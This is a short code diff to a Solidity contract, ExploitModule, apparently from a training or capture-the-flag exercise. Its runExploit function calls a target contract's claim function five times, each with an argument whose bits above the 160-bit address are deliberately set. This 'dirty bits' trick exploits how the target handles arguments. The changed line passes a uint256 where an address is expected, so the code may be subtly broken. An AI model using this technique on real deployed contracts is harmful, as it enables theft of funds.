@@ -1101,11 +1101,9 @@ contract ExploitModule {
     TrainAssemblyDirtyBits public target;
     constructor(address _t) payable { target = TrainAssemblyDirtyBits(payable(_t)); }
     function runExploit() external payable {
-        bytes4 sel = bytes4(keccak256("claim(address)"));
         for (uint256 i = 1; i <= 5; i++) {
             uint256 dirtyArg = uint256(uint160(address(this))) | (i << 160);
-            (bool ok, ) = address(target).call(abi.encodePacked(sel, dirtyArg));
-            require(ok);
+            target.claim(dirtyArg);
         }
     }
     receive() external payable {}
